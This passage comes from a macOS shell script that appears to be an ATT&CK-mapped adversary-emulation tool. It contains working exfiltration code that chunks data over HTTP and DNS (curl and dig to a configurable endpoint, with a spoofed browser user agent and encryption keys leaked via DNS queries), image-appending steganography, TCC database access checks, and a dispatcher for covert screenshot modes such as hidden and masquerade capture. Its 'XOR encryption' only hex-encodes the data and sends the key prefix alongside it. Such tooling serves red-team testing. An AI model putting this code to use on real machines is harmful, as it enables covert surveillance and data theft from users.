            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_PERL -e 'while (read STDIN, $buf, 1024) { print unpack("H*", $buf); }')
            ;;
        *)
            # Return unmodified if unknown encoding type
            core_debug_print "Unknown encoding type: $encode_type - using raw"
            encoded="$output"
            ;;
    esac
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Main encryption function that determines which specific encryption method to use
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption method (none|aes|gpg|xor)
#   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
# Outputs: Encrypted data or original data if no encryption
# Side Effects: None (delegated to specific encryption functions)
core_encrypt_output() {
    local data="$1"
    local method="$2"
    local key="${3:-$ENCRYPT_KEY}"
    
    # Convert to lowercase using tr for sh compatibility
    method=$("$CMD_PRINTF" '%s' "$method" | tr '[:upper:]' '[:lower:]')
    
    case "$method" in
        "none")
            # No encryption, just return the original data
            core_debug_print "No encryption requested, returning raw data"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
        "aes")
            # Use AES encryption method
            core_debug_print "Using AES encryption method"
            encrypt_with_aes "$data" "$key"
            return $?
            ;;
        "gpg")
            # Use GPG encryption method
            core_debug_print "Using GPG encryption method"
            encrypt_with_gpg "$data" "$key"
            return $?
            ;;
        "xor")
            # Use XOR encryption method
            core_debug_print "Using XOR encryption method"
            encrypt_with_xor "$data" "$key"
            return $?
            ;;
        *)
            # Invalid encryption method
            core_debug_print "Unknown encryption type: $method - using raw"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
    esac
}

# Purpose: Encrypt data using AES-256-CBC with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: AES-256-CBC encrypted data in base64 format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "aes" on success
#   - Writes error message to stderr on failure
encrypt_with_aes() {
    local data="$1"
    local key="$2"
    
    # Use global command variable with AES-256-CBC
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_OPENSSL enc -aes-256-cbc -base64 -k "$key" 2>/dev/null)
    if [ $? -eq 0 ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="aes"
        core_debug_print "AES encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "AES encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with AES\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using GPG symmetric encryption with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: GPG symmetrically encrypted data in ASCII armor format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "gpg" on success
#   - Writes error message to stderr on failure/if GPG not found
encrypt_with_gpg() {
    local data="$1"
    local key="$2"
    
    # Use GPG with armor output (ASCII) for direct piping - no temp files needed
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_GPG $CMD_GPG_OPTS --passphrase "$key" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$encrypted_data" ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="gpg"
        core_debug_print "GPG encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "GPG encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with GPG\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using simple XOR encryption with a specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: XOR encrypted data in base64 format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "xor" on success
#   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Create a very simple XOR implementation that works with any shell
    # This is not cryptographically secure but demonstrates the concept
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | xxd -p | tr -d '\n')
    
    # Generate a repeating key of the same length as the hex data
    local key_expanded=""
    local i=0
    local key_len=${#key}
    local hex_len=${#hex_data}
    
    # Create a "one-time pad" by repeating the key
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Convert the expanded key to hex
    local hex_key=$("$CMD_PRINTF" '%s' "$key_expanded" | xxd -p | tr -d '\n')
    
    # For simplicity, just output the hex string (base64 would be more complex)
    # In a real implementation, we'd XOR the bytes
    ENCRYPTION_TYPE="xor"
    
    # Output as base64 to match other encryption methods
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}

# Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
# Inputs: $1 - Data to encode
# Outputs: Base64 URL-safe encoded data
# Side Effects: None
core_url_safe_encode() {
    local data="$1"
    local encoded
    
    # First base64 encode
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Then make URL-safe by replacing + with - and / with _
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: DNS-safe encode data for DNS exfiltration
# Inputs: $1 - Data to encode  
# Outputs: Base64 DNS-safe encoded data
# Side Effects: None
core_dns_safe_encode() {
    local data="$1"
    local encoded
    
    # Always base64 encode first for consistency
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Make DNS-safe (replace + with -, / with _, remove =)
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Generate user agent string for HTTP requests
# Inputs: None
# Outputs: User agent string
# Side Effects: None
core_get_user_agent() {
    $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
}

# Purpose: Prepare proxy argument for curl if needed
# Inputs: None - uses global PROXY_URL variable
# Outputs: Proxy argument for curl or empty string
# Side Effects: May modify global PROXY_URL to add protocol prefix
core_prepare_proxy_arg() {
    local proxy_arg=""
    
    if [ -n "$PROXY_URL" ]; then
        # Check if proxy has protocol prefix, add http:// if missing
        if ! "$CMD_PRINTF"  "$PROXY_URL" | $CMD_GREP -q "^http" ; then
            PROXY_URL="http://$PROXY_URL"
        fi
        proxy_arg="--proxy $PROXY_URL"
    fi
    $CMD_PRINTF "%s" "$proxy_arg"
}

# Purpose: Normalize URI by ensuring it has http:// prefix
# Inputs: $1 - URI to normalize
# Outputs: Normalized URI with protocol prefix
# Side Effects: None
core_normalize_uri() {
    local uri="$1"
    
    if ! "$CMD_PRINTF"  "$uri" | $CMD_GREP -q "^http" ; then
        uri="http://$uri"
    fi
    $CMD_PRINTF "%s" "$uri"
}

# Purpose: Extract domain from a full URI
# Inputs: $1 - Full URI
# Outputs: Domain part of the URI
# Side Effects: None
core_extract_domain() {
    local uri="$1"
    "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
}

# Purpose: Prepare data for exfiltration with optional markers
# Inputs: 
#   $1 - Raw data
# Outputs: Data with optional start/end markers
# Side Effects: None (uses global EXFIL_START/EXFIL_END)
core_prepare_exfil_data() {
    local data="$1"
    
            if [ -n "$EXFIL_START" ]; then
        data="${EXFIL_START}${data}"
            fi
    
            if [ -n "$EXFIL_END" ]; then
        data="${EXFIL_END}${data}"
    fi
    "$CMD_PRINTF"  "$data"
}

# Purpose: Send encryption key via DNS if needed for HTTP exfiltration
# Inputs:
#   $1 - Domain to send key to
# Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
# Side Effects: Makes DNS request
core_send_key_via_dns() {
    local domain="$1"
    local encrypted_key=""
    
                if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
                    # Convert key to base64 DNS-safe format
                    local dns_safe_key
                    dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
                    
                    # Include key in subdomain (chunked if necessary to respect DNS label length limits)
                    local key_chunk_size=40  # DNS labels are limited to 63 chars
                    local key_chunk="${dns_safe_key:0:$key_chunk_size}"
                    
                    # Send key via DNS TXT query - use only domain part, not full URI
                    if ! $CMD_DIG $CMD_DIG_OPTS "k-$JOB_ID-$key_chunk.${domain}" TXT > /dev/null 2>&1; then
                        core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
                    else
                        core_debug_print "Encryption key chunk 1 sent via DNS TXT record"
                    fi
                    
                    # If key is longer than one chunk, send additional chunks
                    if [ ${#dns_safe_key} -gt $key_chunk_size ]; then
                        local key_chunk2="${dns_safe_key:$key_chunk_size:$key_chunk_size}"
                        if [ -n "$key_chunk2" ]; then
                            $CMD_DIG $CMD_DIG_OPTS "k2-$JOB_ID-$key_chunk2.${domain}" TXT > /dev/null 2>&1
                            core_debug_print "Encryption key chunk 2 sent via DNS TXT record"
                            $CMD_SLEEP 0.1
                        fi
                    fi
                    
                    # Brief pause after sending key
                    $CMD_SLEEP 0.2
                fi
    
    "$CMD_PRINTF"  "$encrypted_key"
}

# Purpose: Generate JSON payload for HTTP POST exfiltration
# Inputs:
#   $1 - Encoded data
#   $2 - Optional encrypted key (empty if key sent via DNS)
# Outputs: JSON payload string
# Side Effects: None
core_generate_json_payload() {
    local encoded_data="$1"
    local encrypted_key="$2"
    local hostname
    hostname=$($CMD_HOSTNAME 2>/dev/null || "$CMD_PRINTF"  "unknown")
    
    if [ -n "$encrypted_key" ]; then
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE",
    "key": "$encrypted_key"
  }
}
EOF
    else
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE"
  }
}
EOF
    fi
}

# Purpose: Determine appropriate content type for HTTP exfiltration
# Inputs: None (uses global ENCODE variable)
# Outputs: Content type string
# Side Effects: None
core_get_content_type() {
    local content_type="text/plain"
    if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
        content_type="application/base64"
    elif [ "$ENCODE" = "hex" ] || [ "$ENCODE" = "xxd" ]; then
        content_type="application/octet-stream"
    fi
    "$CMD_PRINTF"  "$content_type"
}

# Purpose: Execute HTTP POST exfiltration
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes HTTP request
core_exfil_http_post() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # For encrypted data, we need to handle the key
        local domain=$(core_extract_domain "$full_uri")
        local encrypted_key=$(core_send_key_via_dns "$domain")
        local json_payload=$(core_generate_json_payload "$encoded_data" "$encrypted_key")
        
        # Execute POST with JSON payload
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
            -H "Content-Type: application/json" \
                -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encryption: $ENCRYPTION_TYPE" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$json_payload" \
                        "$full_uri" > /dev/null 2>&1
                else
        # For unencrypted data, simpler payload
        local content_type=$(core_get_content_type)
        
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$encoded_data" \
                        "$full_uri" > /dev/null 2>&1
                fi
    
    return $?
}

# Purpose: Execute HTTP GET exfiltration with chunking (legacy method)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes multiple HTTP requests
core_exfil_http_get() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    # Calculate chunk size based on URL length limits
                local max_url_length=1800
                local base_url_length=${#full_uri}
                local max_data_length=$((max_url_length - base_url_length - 50))  # 50 for other params
                local chunk_size=$CHUNK_SIZE
    
                if [ $max_data_length -lt $chunk_size ]; then
                    chunk_size=$max_data_length
                fi
                # Send start signal
                $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                    -G \
                    -A "$user_agent" \
                    -H "X-Job-ID: $JOB_ID" \
                    --data-urlencode "signal=start" \
                    --data-urlencode "id=$JOB_ID" \
                    "$full_uri" > /dev/null 2>&1
                
    if [ $? -ne 0 ]; then
        return 1
    fi
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
    local data_len=${#encoded_data}
    
                while [ $start_pos -lt $data_len ]; do
                    local chunk="${encoded_data:$start_pos:$chunk_size}"
                    start_pos=$((start_pos + chunk_size))
                    
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-urlencode "d=$chunk" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunk=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
            
            if [ $? -ne 0 ]; then
            return 1
                    fi
                    
                    $CMD_SLEEP 0.1  # Rate limiting
                    chunk_num=$((chunk_num + 1))
                done
                
    # Send end signal
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        --data-urlencode "signal=end" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunks=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
                    
    return $?
}

# Purpose: Execute DNS exfiltration with chunking
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects: Makes multiple DNS requests
core_exfil_dns() {
    local data="$1"
    
            if [ -z "$EXFIL_URI" ]; then
                return 1
            fi
            
    # Prepare DNS-safe data
            local dns_data="$data"
    if [ "$ENCODE" = "none" ]; then
                dns_data=$(core_dns_safe_encode "$data")
            else
                dns_data=$("$CMD_PRINTF" '%s' "$dns_data" | tr '+/' '-_' | tr -d '=')
            fi
    
    # Calculate appropriate chunk size for DNS
            local max_label_size=63
    local prefix_length=10  # Approximate length of prefix like "p0."
            local max_allowed_chunk=$((max_label_size - prefix_length))
            local max_chunk_size=$CHUNK_SIZE
    
            if [ $max_chunk_size -gt $max_allowed_chunk ]; then
                max_chunk_size=$max_allowed_chunk
            fi
    
    # Send start signal
            if ! $CMD_DIG $CMD_DIG_OPTS "start.${EXFIL_URI}" A > /dev/null 2>&1; then
                return 1
            fi
    
    # Send encryption key via TXT record if encryption is enabled
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # Convert key to base64 DNS-safe format
        local dns_safe_key
        dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
        
        # Send key via DNS TXT query
        if ! $CMD_DIG $CMD_DIG_OPTS "key-$JOB_ID.${EXFIL_URI}" TXT > /dev/null 2>&1; then
            core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
        fi
        
        # Brief pause after sending key
        $CMD_SLEEP 0.2
    fi
    
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
            local data_len=${#dns_data}
    
    while [ $start_pos -lt $data_len ]; do
                local chunk="${dns_data:$start_pos:$max_chunk_size}"
        start_pos=$((start_pos + max_chunk_size))
        
                local query="p${chunk_num}.${chunk}.${EXFIL_URI}"
                if ! $CMD_DIG $CMD_DIG_OPTS "$query" A > /dev/null 2>&1; then
            return 1
                fi
                
                $CMD_SLEEP 0.1  # Rate limiting
        chunk_num=$((chunk_num + 1))
    done
    
    # Send end signal
                if ! $CMD_DIG $CMD_DIG_OPTS "end.${EXFIL_URI}" A > /dev/null 2>&1; then
                    return 1
                fi
                
                return 0
}

# Purpose: Exfiltrate data using the specified method (HTTP, DNS, etc.)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Side Effects:
#   - Logs exfiltration attempt if LOG_ENABLED=true
#   - Performs network requests to exfiltrate data
#   - May modify data for transport (encoding, chunking)
core_exfiltrate_data() {
    local data="$1"
    local result=0
    
    # Log exfiltration attempt
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "Exfiltrating data via $EXFIL_METHOD" "info" false
    fi
    # Check for required URI
    if [ -z "$EXFIL_URI" ]; then
        core_handle_error "No exfiltration URI specified for $EXFIL_METHOD"
            return 1
    fi
    # Route to appropriate method
    case "$EXFIL_METHOD" in
        http|https)
            # Determine whether to use POST or GET based on EXFIL_TYPE
            if [ "$EXFIL_TYPE" = "http" ]; then
                core_exfil_http_post "$data"
            else
                core_exfil_http_get "$data"
            fi
            result=$?
            ;;
            
        dns)
            core_exfil_dns "$data"
            result=$?
            ;;
            
        *)
            core_handle_error "Unknown exfiltration method: $EXFIL_METHOD"
            return 1
            ;;
    esac
    
    # Handle result
    if [ $result -ne 0 ]; then
        core_handle_error "Failed to exfiltrate data via $EXFIL_METHOD"
        return 1
    fi
    
    "$CMD_PRINTF"  "[INFO] [%s] Data exfiltrated successfully via %s\n" "$(core_get_timestamp)" "$EXFIL_METHOD"
    return 0
}

# Purpose: Manages final output delivery - logging, exfiltration, and display
# Inputs:
#   $1 - Processed data (after formatting/encoding/encryption)
# Outputs: None (writes to various destinations)
# Side Effects:
#   - Logs output if LOG_ENABLED=true
#   - Exfiltrates data if EXFIL=true
#   - Always prints data to stdout
#   - May print encryption key to stderr in debug mode
core_transform_output() {
    local output="$1"
    
    # Log the output if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$output" "output" false
    fi
    
    # Exfiltrate the output if exfiltration is enabled
    if [ "$EXFIL" = true ]; then
        core_exfiltrate_data "$output"
    fi
    
    # Always print data to ensure it's visible
    # Important to display encrypted/encoded data even when logging
    $CMD_PRINTF "%s\n" "$output"
    
    # When encrypting, also print the key in debug mode
    if [ "$DEBUG" = true ] && [ "$ENCRYPT" != "none" ]; then
        $CMD_PRINTF "[DEBUG] [%s] Encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
    fi
}


# Purpose: Extract hidden data from a steganography image
# Inputs: $1 - Image file with hidden data
# Outputs: Extracted and decoded data
# Side Effects: None
core_extract_steganography() {
    local steg_file="$1"
    
    # Verify file exists
    if [ ! -f "$steg_file" ]; then
        core_handle_error "Steganography file not found: $steg_file"
        return 1
    fi
    
    # Extract the hidden data
    local encoded_data=""
    encoded_data=$($CMD_STRINGS "$steg_file" | $CMD_GREP -A1 'STEG_DATA_START' | $CMD_TAIL -1)
    
    if [ -z "$encoded_data" ]; then
        core_handle_error "No hidden data found in file: $steg_file"
        return 1
    fi
    
    # Decode the base64 data
    local decoded_data=""
    decoded_data=$("$CMD_PRINTF" '%s' "$encoded_data" | $CMD_BASE64 -d 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        core_handle_error "Failed to decode hidden data"
        return 1
    fi
    
    # Return the decoded data
    "$CMD_PRINTF" '%s' "$decoded_data"
    return 0
}

# Purpose: Perform steganography by hiding data in an image
# Inputs: None (uses global variables)
# Outputs: Status message
# Side Effects: Creates output image file
core_steganography() {
    # Define local variables
    local message=""
    local carrier_image=""
    local output_image=""
    local input_file=""
    local result=""
    
    # Get values from globals or use defaults
    input_file="$STEG_EXTRACT_FILE"
    message="$STEG_MESSAGE"
    carrier_image="${STEG_CARRIER_IMAGE:-$DEFAULT_STEG_CARRIER}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Verify we have either input file or message
    if [ -z "$input_file" ] && [ -z "$message" ]; then
        message="Hidden data created with ATT&CK macOS T1027.013"
        "$CMD_PRINTF"  "[INFO] [%s] No data specified, using default message\n" "$(core_get_timestamp)"
    fi
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    
    # If using input file, verify it exists
    if [ -n "$input_file" ] && [ ! -f "$input_file" ]; then
        core_handle_error "Input file not found: $input_file"
        return 1
    fi
    
    # Prepare data to hide - either from file or message
    local data_to_hide=""
    if [ -n "$input_file" ]; then
        # Read input file
        data_to_hide=$($CMD_CAT "$input_file" 2>/dev/null)
        if [ $? -ne 0 ]; then
            core_handle_error "Failed to read input file: $input_file"
            return 1
        fi
    else
        # Use message
        data_to_hide="$message"
    fi
    
    # Convert data to base64 to support all characters
    local encoded_data=""
    encoded_data=$("$CMD_PRINTF" '%s' "$data_to_hide" | $CMD_BASE64)
    
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if $CMD_CP "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$encoded_data" >> "$output_image"
        
        # Success message
        local data_size=$("$CMD_PRINTF"  -n "$data_to_hide" | $CMD_WC -c | $CMD_SED 's/^ *//')
        result="Steganography successful\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        "$CMD_PRINTF"  "$result"
        
        "$CMD_PRINTF"  "[INFO] [%s] Data hidden successfully in %s\n" "$(core_get_timestamp)" "$output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
}

# Purpose: Apply steganography to data in the processing pipeline
# Inputs: $1 - Data to hide in steganography
# Outputs: Status message (actual data is written to file)
# Side Effects: Creates output image file
core_apply_steganography() {
    local data_to_hide="$1"
    local carrier_image=""
    local output_image=""
    local result=""
    
    # Get values from globals or use defaults
    carrier_image="${STEG_CARRIER_IMAGE:-$DEFAULT_STEG_CARRIER}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if $CMD_CP "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$data_to_hide" >> "$output_image"
        
        # Success message
        local data_size=$("$CMD_PRINTF"  -n "$data_to_hide" | $CMD_WC -c | $CMD_SED 's/^ *//')
        result="Steganography applied\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        
        "$CMD_PRINTF"  "[INFO] [%s] Data hidden successfully in %s\n" "$(core_get_timestamp)" "$output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
    
    "$CMD_PRINTF"  "$result"
}

# Purpose: Check file permissions based on configuration
# Inputs: 
#   $1 - File path to check
#   $2 - Read permission required (true/false)
#   $3 - Write permission required (true/false)
#   $4 - Execute permission required (true/false)
# Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
# Side Effects: Logs debug information
core_check_perms() {
    local file="$1"
    local read_required="$2"
    local write_required="$3"
    local execute_required="$4"
    
    # Check if file exists
    if [ ! -e "$file" ]; then
        core_debug_print "File does not exist: $file"
        # Only fail if any permission is required
        [ "$read_required" = "true" ] || [ "$write_required" = "true" ] || [ "$execute_required" = "true" ]
        return $?
    fi
    
    # Check required permissions
    local missing_perms=""
    [ "$read_required" = "true" ] && [ ! -r "$file" ] && missing_perms="${missing_perms}read "
    [ "$write_required" = "true" ] && [ ! -w "$file" ] && missing_perms="${missing_perms}write "
    [ "$execute_required" = "true" ] && [ ! -x "$file" ] && missing_perms="${missing_perms}execute "
    
    if [ -n "$missing_perms" ]; then
        core_debug_print "Missing required permissions for $file: $missing_perms"
        return 1
    fi
    core_debug_print "All required permissions granted for $file"
    return 0
}

# Side Effects: None
# Note: Simple implementation for YAML check_fda
core_check_fda() {
    [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
}

# Purpose: Check if database is locked by another process
# Inputs: $1 - Database path
# Outputs: 0 if database is not locked, 1 if locked
# Side Effects: None
# Note: Comprehensive implementation checking lock files, processes, and database state
core_check_db_lock() {
    local db_path="$1"
    
    # Check if database file exists
    if [ ! -f "$db_path" ]; then
        return 1
    fi
    
    # Method 1: Check for SQLite lock files
    if [ -f "${db_path}-wal" ] || [ -f "${db_path}-shm" ] || [ -f "${db_path}-journal" ]; then
        core_debug_print "Database lock files detected for $db_path"
        return 1
    fi
    
    # Method 2: Check if any process has the database file open (macOS specific)
    if command -v "$CMD_LSOF" > /dev/null 2>&1; then
        if $CMD_LSOF "$db_path" > /dev/null 2>&1; then
            core_debug_print "Process has database file open: $db_path"
            return 1
        fi
    fi
    
    # Method 3: Try to open database briefly to check if it's locked (fallback)
    if ! timeout 1 $CMD_SQLITE3 "$db_path" "SELECT 1;" > /dev/null 2>&1; then
        core_debug_print "Database query test failed for $db_path"
        return 1
    fi
    
    core_debug_print "Database appears to be unlocked: $db_path"
    return 0
}

# Main function 
core_main() {
    local raw_output=""
    local processed_output=""
    
    # Step 1: Parse command line arguments (no validation)
    core_parse_args "$@"
    
    # Step 2: Display help if requested (early exit)
    if [ "$SHOW_HELP" = true ]; then
        core_display_help
        return 0
    fi
    
    # Step 3: Validate parsed arguments
    core_validate_parsed_args || exit 1
    
    # Step 4: Generate encryption key if needed
    core_generate_encryption_key
    
    # Step 5: Validate required commands
    core_validate_command || exit 1
    
    # Process OPSEC checks from YAML configuration
    if [ "$CHECK_FDA" = "true" ]; then
        core_debug_print "Performing Full Disk Access check"
        if ! core_check_fda; then
            core_handle_error "Full Disk Access not granted - script cannot access required databases"
            exit 1
        fi
        core_debug_print "Full Disk Access check passed"
    fi
    
    if [ "$CHECK_PERMS" = "true" ]; then
        core_debug_print "Permission checks enabled - will be validated per function"
    fi
    
    if [ "$CHECK_DB_LOCK" = "true" ]; then
        core_debug_print "Database lock checks enabled - will be validated per function"
    fi
    
    # Initialize the log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        # Initialize logging at start
        core_log_output "Starting ${NAME}" "started" true
    fi
    
    # Default data source identifier
    local data_source="generic"
    
    # Check if we should extract steganography data
    if [ "$STEG_EXTRACT" = true ]; then
        data_source="steg_extracted"
    else
        # Execute script-specific logic here
# Execute main logic
raw_output=""

# Execute functions for -s|--screenshot
if [ "$SCREENSHOT" = true ]; then
    core_debug_print "Executing functions for -s|--screenshot"
    result=$(capture_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for -d|--display
if [ "$DISPLAY" = true ]; then
    core_debug_print "Executing functions for -d|--display"
    result=$(capture_screenshot_with_info)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --list-windows
if [ "$LIST_WINDOWS" = true ]; then
    core_debug_print "Executing functions for --list-windows"
    result=$(list_available_windows)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --window-id
if [ "$WINDOW_ID" = true ]; then
    core_debug_print "Executing functions for --window-id"
    result=$(capture_window_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --browser-windows
if [ "$BROWSER_WINDOWS" = true ]; then
    core_debug_print "Executing functions for --browser-windows"
    result=$(capture_browser_windows)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --app-windows
if [ "$APP_WINDOWS" = true ]; then
    core_debug_print "Executing functions for --app-windows"
    result=$(capture_app_windows)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --hidden
if [ "$HIDDEN" = true ]; then
    core_debug_print "Executing functions for --hidden"
    result=$(capture_hidden_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --masquerade
if [ "$MASQUERADE" = true ]; then
    core_debug_print "Executing functions for --masquerade"
    result=$(capture_masquerade_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --cache
if [ "$CACHE" = true ]; then
    core_debug_print "Executing functions for --cache"
    result=$(capture_cache_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --osascript
if [ "$OSASCRIPT" = true ]; then
    core_debug_print "Executing functions for --osascript"
    result=$(capture_osascript_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --swift
if [ "$SWIFT" = true ]; then
    core_debug_print "Executing functions for --swift"
    result=$(capture_swift_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --python
if [ "$PYTHON" = true ]; then
    core_debug_print "Executing functions for --python"
    result=$(capture_python_screenshot)
    raw_output="${raw_output}${result}\n"
fi

# Execute functions for --tcc-query
if [ "$TCC_QUERY" = true ]; then
